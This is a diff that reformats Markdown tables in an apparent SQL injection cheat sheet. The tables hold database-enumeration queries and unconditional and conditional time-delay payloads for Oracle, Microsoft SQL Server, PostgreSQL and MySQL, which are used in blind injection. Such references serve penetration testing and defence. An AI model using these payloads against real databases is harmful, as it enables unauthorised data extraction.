@@ -55,12 +55,12 @@ You can query the database to determine its type and version. This information i
 
 You can list the tables that exist in the database, and the columns that those tables contain.
 
-|   |   |
-|---|---|
-|Oracle|`SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`|
-|Microsoft|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|
-|PostgreSQL|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|
-|MySQL|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|
+|            |                                                                                                                              |
+| ---------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| Oracle     | `SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                              |
+| Microsoft  | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
+| PostgreSQL | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
+| MySQL      | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
 
 ## Conditional errors
 
@@ -102,23 +102,23 @@ With MySQL, batched queries typically cannot be used for SQL injection. However,
 
 You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
 
-|   |   |
-|---|---|
-|Oracle|`dbms_pipe.receive_message(('a'),10)`|
-|Microsoft|`WAITFOR DELAY '0:0:10'`|
-|PostgreSQL|`SELECT pg_sleep(10)`|
-|MySQL|`SELECT SLEEP(10)`|
+|            |                                       |
+| ---------- | ------------------------------------- |
+| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
+| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
+| PostgreSQL | `SELECT pg_sleep(10)`                 |
+| MySQL      | `SELECT SLEEP(10)`                    |
 
 ## Conditional time delays
 
 You can test a single boolean condition and trigger a time delay if the condition is true.
 
-|   |   |
-|---|---|
-|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`|
-|Microsoft|`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`|
-|PostgreSQL|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`|
-|MySQL|`SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`|
+|            |                                                                                                                |
+| ---------- | -------------------------------------------------------------------------------------------------------------- |
+| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
+| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                              |
+| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                |
+| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                 |
 
 ## DNS lookup
 
